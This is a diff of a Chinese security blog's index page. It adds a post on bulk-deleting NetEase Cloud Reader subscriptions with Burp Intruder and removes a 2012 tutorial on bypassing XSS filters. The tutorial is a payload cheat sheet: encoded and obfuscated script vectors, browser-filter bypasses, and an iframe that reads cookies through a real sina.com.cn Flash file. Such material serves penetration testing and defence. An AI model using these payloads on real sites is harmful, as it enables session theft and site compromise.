@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="      根据摩尔定律：每一美元所能买到的电脑性能，将每隔18个月翻两倍以上，由此可以看到科技更新的速度。同时移动互联网行业也不甘示弱，根据最近的数据显示国内移动终端已经突破4亿，可以想象这是一个多大的市场【1】。移动平台中Android、IOS与WP日益强大，而Symbian、 &hellip;">
+  <meta name="description" content="  关于GoogleReader 最近什么话题最火？这话要是问技术猿或者Geeker，绝对不是苍老师或者小*丽亚出什么新片没，也不是3.15晚会的“网易，央视喊你去做广告”，而是Google决定在7月1日关闭已有7年Google Reader这一震惊的消息，各类论坛社区（v2ex、知乎等）、 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +67,79 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/03/16/delete_wangyi_yunyuedu_rss/">批量删除网易云阅读订阅</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-03-16T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2013/03/16/delete_wangyi_yunyuedu_rss/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3> <img class="aligncenter" alt="网易云阅读" src="http://blog.ourren.com/blog/wangyiyunyuedu.jpg" width="876" height="222">
+</h3>
+
+
+<h3></h3>
+
+
+<h3><strong>关于GoogleReader</strong></h3>
+
+
+<p>最近什么话题最火？这话要是问技术猿或者Geeker，绝对不是苍老师或者小*丽亚出什么新片没，也不是3.15晚会的“网易，央视喊你去做广告”，而是Google决定在7月1日关闭已有7年Google Reader这一震惊的消息，各类论坛社区（v2ex、知乎等）、技术资讯站（cnbeta、虎嗅、36kr等）和个人媒体（月光博客、善用佳软、微信公开平台等）都纷纷讨论：痛骂Google不懂IT民工，不懂互联网；而更多的则是讨论如何选择替代品，导致最近freedly、newsblur、digg、鲜果、有道等等都很忙，不止是服务器很忙，开发人员也很忙。各大公司也纷纷为GR粉提出解决方案，支持一键导入GR源，但是这样子是否能够解决问题呢？</p>
+
+<p>本人虽然使用GR时间较晚（2011年入手），但是现在GR已经成为我日常生活中不可缺少的部分，上班的时候使用GReader Pro同步GR中的文中，下班途中或者闲暇时就拿出来翻阅下，将重要的文章和比较有用的文章加星，以方便第二天抽空时间进行精读，可以说GR与GReader Pro绝配。后来为了方便安全从业者可以分享自己感觉不错的文章，建立了<a href="http://sec-wiki.com" target="_blank">SecWiki</a>，到现在网站已经有收藏1000+文章，但是好景不长，随着GR关闭，这条路暂时关闭，这两天也把国内外这类工具试了个遍，还是没有找到一款好的产品，好在Freedly可能会开放API，GReader Pro貌似会更新、Digg会新开发产品，值得等待。</p>
+
+<h3><strong>删除缘由</strong></h3>
+
+
+<p>扯了这么多，还没说主题。</p>
+
+<p>网易云阅读是我用来看科技新闻的，软件阅览效果不错，也支持离线下载，这里推荐几个资讯源（36kr、虎嗅、知乎、爱范儿）。今天早上登陆网页版网易云阅读，主动提示可以导入Google Reader订阅栏目了，看到了吧，这两天网易开发人员也没闲着，肯定加班赶产品。手一贱，直接导入原来Google Reader项目，评价下：擦，居然没有给我导入分类信息。然后我打开手机网易云阅读软件，问题就来了，直接显示一千多订阅源，不管有没有更新的都会显示，你让我天天怎么看资讯？果断在微博上@网易云阅读提意见，自己感觉没戏。自己就是搞技术的，果断应该自己去解决，于是打开Google 开发工具（虽然以后不能用GR了，还是可以用chrome吧），抓包看了下取消订阅源的请求数据包，发现有戏，于是有了此文。一来吐槽下google停止GR服务，二来方便跟我犯同样的童鞋。</p>
+
+<h3></h3>
+
+
+<h3><strong>具体步骤</strong></h3>
+
+
+<p>工具：burp（不知道的google下）、chrome、notepad++</p>
+
+<p>1、初步分析：登陆网页版网易云阅读，登陆后开启burp代理，并试着删除一个订阅源，查看burp日志可以发现每次删除订阅源只是传递了一个id参数，熟悉burp的都知道可以用intruder功能实现重复提交；</p>
+
+<p><img class="aligncenter" alt="步骤一" src="http://blog.ourren.com/blog/wyyyd_step1.jpg" width="962" height="442"></p>
+
+<p>2、提取参数：如何提取订阅的id，果断使用正则匹配。查看web版网易云阅读的源码，复制后用正则匹配进行匹配，采用正则匹配式：(cst_rss<em>)[a-z0-9</em>]*    并保存为list.txt。</p>
+
+<p><img class="aligncenter" alt="步骤2" src="http://blog.ourren.com/blog/wyyyd_step2.jpg" width="1275" height="661"></p>
+
+<p><img class="aligncenter" alt="步骤2_2" src="http://blog.ourren.com/blog/wyyyd_step3.jpg" width="958" height="513"></p>
+
+<p>3、完工：使用burp的intruder批量实现删除订阅源，将刚测试的burp历史记录发送到intruder选项，添加变量并指定字典，发送。</p>
+
+<p><img class="aligncenter" alt="步骤3" src="http://blog.ourren.com/blog/wyyyd_step4.jpg" width="975" height="366"></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -660,282 +733,6 @@ ERROR 1105 (HY000): XPATH syntax error: &lsquo;^$admin888^$&rsquo;[/code]</p>
 <p>（5）<a href="http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_one.html">贝叶斯推断及其互联网应用（一）：定理简介</a></p>
 
 <p>（6）<a href="http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_two.html">贝叶斯推断及其互联网应用（二）：过滤垃圾邮件</a></p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/09/03/xss_bypass_technology/">跨站测试与利用中的绕过技术</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-09-03T00:00:00-07:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/09/03/xss_bypass_technology/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h2>1.1 bypass Char</h2>
-
-
-<p>通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。</p>
-
-<p>本节主要针对单字符过滤进行研究，分为引号、尖括号、括号这三个符号进行研究。</p>
-
-<h3>1.1.1 引号</h3>
-
-
-<p>在跨站测试中很多的vector(即攻击向量)本身是不包含引号的，例如下面的一些vector。但是在利用中经常需要使用引号，如果对引号进行了过滤，可以采取如下措施进行绕过。
-[code lang=&ldquo;javascript&rdquo;]
-vector:</p>
-
-<script>alert(/ourren_demo/)</script>
-
-
-<p>&lt;iframe/onload=alert(/ourren_demo/)>
-<img src=x onerror=alert(/ourren_demo/)>
-<p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
-[/code]
-<strong>1)String.fromCharCode</strong></p>
-
-<p>fromCharCode可以对利用代码中的引号进行编码处理，但是需要利用eval函数结合进行使用，例如:
-[code lang=&ldquo;javascript&rdquo;]
-<script>alert(&lsquo;ourren_demo&rsquo;)</script>
-&mdash;&ndash;>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>
-[/code]
-<strong>2)location.hash</strong></p>
-
-<p>将带有引号的内容放在location.hash中，其实这个也可以突破跨站长度的控制。
-[code lang=&ldquo;javascript&rdquo;]
-<script>eval(location.hash.slice(1))</script>#alert(&lsquo;a&rsquo;)[/code]
-<h3>1.1.2 尖括号</h3>
-通常程序员为了偷懒都只会过滤尖括号，因此尖括号在跨站过滤中遇到情况最多。一般情况下如果输入没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行如下测试：</p>
-
-<p><strong>1</strong><strong>）事件函数</strong></p>
-
-<p>常用的一些事件函数有：onerror、onmouseover、onload等(同时可以关注下HTML5新标签)，需要的时候可以对JavaScript的事件函数进行fuzz。
-[code lang=&ldquo;javascript&rdquo;]
- <img src=x onerror=alert(/ourren_demo/)>
- <p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
- <frameset onload=alert(/ourren_demo/)>
- <body onload=alert(/ourren_demo/)>[/code]</p>
-
-<p><strong>2)style</strong><strong>与expression</strong></p>
-
-<p>通过标签的style样式进行跨站(测试中只有IE成功，同时还得考虑filter问题)。
-[code lang=&ldquo;javascript&rdquo;]
-<div style="width:expression(alert('ourren_demo'));">  [/code]</p>
-
-<p><strong>3)</strong> <strong>JavaScript</strong><strong>伪协议</strong></p>
-
-<p>JavaScript伪协议进行绕过。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
- <img src=javascript:alert('ourren_demo')> （仅IE)  [/code]
-<h3>1.1.3 括号</h3>
-如果测试中发现括号被过滤了，或者无法注入括号，可以进行如下测试：</p>
-
-<p>1）外部文件</p>
-
-<p>通过src引入外部文件，而利用代码放在外部文件中（其中外部文件的后缀可以不为js）。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<script src='1.js'></script>
-<script src='2.jpg'></script>
-[/code]</p>
-
-<p>2）hex、dec编码</p>
-
-<p>利用十六进制与十进制进行编码。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97
-&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
-[/code]
-<h2>1.2 bypass filter</h2>
-针对跨站问题日益严重，浏览器厂商从自身浏览器安全出发推出了各自的跨站过滤器。但是这类过滤器基本上只支持反射型跨站，其他类型跨站基本不受影响。</p>
-
-<p>各种浏览器采用的防御机制各不相同。反射型跨站防御方面：Firefox基本没什么防御，而IE和chrome都有各自的防御机制，并且都很难绕过，这里主要总结下现有的一些可以绕过机制。
-<h3>1.2.1 IE Filter</h3>
-IE从IE7就支持XSS Filter，其整体架构可见参考文献1，正则匹配部分可以参见文献2。实际处理步骤可分为三步：首先对IE进行启发式过滤（heuristic filters，正则匹配）；如果在HTTP请求中匹配到这些特征，那么就做一个动态签名（create dynamic signature）；如果在HTTP响应中有原来的签名，那么就进行替换修改（neuter response）。在IE全补丁下进行测试，现有公布的绕过技术基本上很少，先总结如下：</p>
-
-<p><strong>1</strong><strong>）<a href=></strong></p>
-
-<p>针对普通的反射型跨站，可以利用A标签和“sc%0aript”实现绕过，不过需要用户交互，这里需要美工师咯。其实原理是页面输出后这两个页面属于同一域，因此不会产生过滤。如果href里面的地址是不同域就会产生过滤。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&ldquo;>
-<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&rdquo;>
-<div style="position: absolute; left: 0px; top: 0px; height: 1000px; width: 1000px;
-padding: 1em;background:black;text-align: center;">click to continue</div></a>
-[/code]</p>
-
-<p><strong>2</strong><strong>）utf7</strong></p>
-
-<p>通过UTF7-BOM实现注入代码，全补丁情况下只有当header里编码为utf-7才能成功，可以参考文献3。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-%2BACIAPgA8-script%2BAD4-alert%28/ourren_demo/%29%2BADw-%2Fscript%2BAD4APAAi-&amp;oe=Windows-31J
-[/code]</p>
-
-<p><strong>3) Flash</strong></p>
-
-<p>在 <a href="http://blog.ourren.com">www.B.com</a>域名下用iframe嵌入<a href="http://blog.ourren.com">www.A.com</a>的flash XSS文件。当受害者打开了<a href="http://blog.ourren.com">www.B.com</a>的域名时，我们可以成功获取其在<a href="http://blog.ourren.com">www.A.com</a>的cookies数据，参见文献8。</p>
-
-<p>测试代码如下(IE)：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
-(function(){location.href=%22javascript:&lsquo;<script>alert(document.cookie)</script>&rsquo;%22})()&rdquo;></iframe>
-[/code]</p>
-
-<p>在chrome中，可能会导致浏览器崩溃，可以改用以下代码。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
-(function(){alert(document.cookie)})()&rdquo;></iframe>
-[/code]
-<h3>1.2.2 chrome filter</h3>
-chrome浏览器针对xss过滤规则跟IE有比较大的区别，不同版本的chrome测试也会不同，现有的资料可以参考文献4、5。</p>
-
-<p><strong>1）  </strong><strong>data</strong><strong>协议</strong></p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-?vuln=<a href="javascript:alert(document.cookie);">click</a> //会拦截
-&ndash;>转换成  <a href="javascript:void(0)">click</a>
-//bypass
-?vuln=<a href="data:text/html;
-base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=
-">click<a>
-->OK
-[/code]</p>
-
-<p><h2>1.3 bypass richtext</h2>
-富文本常见类别有留言，日志或者邮件等。与一般的跨站相比它可以使用现有的标签进行测试分析。一般过滤机制分为两种：黑名单、白名单，这两类机制实质都是基于正则匹配进行过滤，因此在测试过程中需要对比输入和输出，然后进行针对性变化。</p>
-
-<p>常见测试流程：输入常见标签和事件&mdash;&mdash;>是否有存在的标签没有过滤&mdash;&mdash;->变形或者分析其属性</p>
-
-<p>标签：<em>object, applet, base, link, meta, import, embed, vmlframe, iframe, script, style, isindex, form</em><em>，</em><em>textarea</em><em>，</em></p>
-
-<p>字符：<em>javascript:, vbscript: </em></p>
-
-<p>事件：<em>onload,onerror,on*</em>
-<h3>1.3.1 绕过规则</h3>
-本小节将一些常见的一些变化规则进行了归类，实际测试中结合多种方式进行组合测试。</p>
-
-<p><strong> 1</strong><strong>）未递归过滤</strong></p>
-
-<p>很多富文本过滤都是针对关键字过滤，但是没有进行递归过滤，导致过滤后的结果重新组成新的标签，例如：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-&lt;ifra<iframe>me>之&mdash;&mdash;过滤&mdash;&mdash;<iframe>&mdash;&mdash;&mdash;-<iframe>
-&lt;s<script></script>cript>&mdash;&ndash;过滤&mdash;<script>&mdash;&mdash;&mdash;-<script></script>
-[/code]
-<strong>2)</strong><strong>编码</strong></p>
-
-<p>利用字符的十六进制和十进制编码进行绕过关键字。由于expression只有IE能执行，因此仅限于IE。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
- <div style="width:expression(alert(/ourren_demo/))">ourren_demo</div><br/>
-<div style="width:\0065xpression(alert(/ourren_demo/))">ourren_demo</div>
-//两次不同类型编码
-<div style="width:\0065xpressio\6e(alert(/ourren_demo/))">ourren_demo</div><br/>
-<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110
-&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
-[/code]</p>
-
-<p><strong>3)</strong><strong>特殊字符</strong></p>
-
-<p>在构造的vector中可以插入tab、换行、等其他空白字符或者&#8221;/**&ldquo;绕过关键字匹配，基本上也只限于IE。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<img src="java  scr ipt:alert(/ourren_demo/)">  两次tab,ie6
-<div style="width:exp/**
-**/ression(alert(/ourren_demo/))">ourren_demo</div>  IE
-[/code]</p>
-
-<p><strong>4)</strong><strong>非常见协议</strong></p>
-
-<p>利用object标签，将date属性数据进行base64编码绕过关键数据，同时object标签也是经常被遗忘的标签。</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgvaW5zaWdodC1sYWJzLyk8L3NjcmlwdD4=">
-[/code]</p>
-
-<p><strong>5)HTML5</strong></p>
-
-<p>利用HTML5新标签或者新属性进行绕过，相对而言这类利用要求的环境相对比较苛刻，详细见参考文献6。</p>
-
-<p>新标签:<em><button>,<video>,<audio>,<article>,<footer>,<nav></em></p>
-
-<p>新属性:<em>autocomplete, autofocus, pattern ..etc</em></p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<input onfocus=write(1) autofocus>
-<video poster=javascript:alert(1)//></video>
-[/code]</p>
-
-<p><strong>6)</strong><strong>浏览器方面</strong></p>
-
-<p>可以从浏览器解析角度进行考虑，需要浏览器解析方面进行深入分析，然后进行改进与分析，提供几个这类的vector。</p>
-
-<p>// IE的注释方式
-[code lang=&ldquo;javascript&rdquo;]
-<!--[if IE]><img src=# width=0 height=0 onerror=alert(/ourren_demo/)>&lt;![endif]&ndash;><br/>
-<comment><img src="</comment><img src=x onerror=alert(/ourren_demo/)//">   IE
-[/code]
-<h3>1.3.2 利用技巧</h3>
-在实际利用中常常会遇到一些其它问题，比如说代码死循环，长度不够用等先将其总结如下：</p>
-
-<p><strong>       1)expression</strong></p>
-
-<p>由于expression属性比较特殊,同时只支持IE，而其执行相当于一个死循环的EVAL函数，同时style标记里不能出现&#8221;;&ldquo;字符，也就是不能构造多条连接在一起的javascript，因此构造出如下语句：</p>
-
-<p>[code lang=&ldquo;javascript&rdquo;]
-<DIV STYLE="xss:ex/**/pre/**/ssion(eval(xss));" xss="var Then=new Date();Then.setTime(Then.getTime()+10*1000);
-if(document.cookie.indexOf('Cookie1=') == -1){document.cookie='Cookie1=RAY;expires='+Then.toGMTString();
-alert(/ourren_demo/);}">
-//设置一个COOKIE在10秒后失效，并在这条COOKIE语句中执行其他语句或函数。
-也可以通过window对象来实现：
-<div style="width:expression((window.x==1)?'':(window.x=1,alert(/ourren_demo/)))">xsser</div>
-[/code]</p>
-
-<p><strong>2)</strong><strong>长度限制</strong></p>
-
-<p>这个在&#8221;突破XSS字符数量限制执行任意JS代码&#8221;一文中有详细讲解，参考文献7。当然在支持HTML5的浏览器还可以利用下本地存储。
-<h2><em>参考文献</em></h2>
-<em>1.</em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx"><em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx">http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx</a></em></a><em> </em></p>
-
-<p><em>2. Abusing Internet Explorer 8&rsquo;s XSS Filters.pdf </em></p>
-
-<p><em>3. </em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html"><em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html">http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html</a></em></a><em> </em></p>
-
-<p><em>4. </em><a href="http://evilcos.me/?p=60"><em><a href="http://evilcos.me/?p=60">http://evilcos.me/?p=60</a></em></a><em> </em></p>
-
-<p><em>5. </em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html"><em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html">http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html</a></em></a><em> </em></p>
-
-<p><em>6. </em><a href="http://html5sec.org/"><em><a href="http://html5sec.org/">http://html5sec.org/</a></em></a><em> </em></p>
-
-<p><em>7. </em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt"><em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt">http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt</a></em></a><em> </em></p>
-
-<p><em>8.</em> <a href="http://zone.wooyun.org/content/368"><a href="http://zone.wooyun.org/content/368">http://zone.wooyun.org/content/368</a></a><em></em></p>
 </div>
   
   
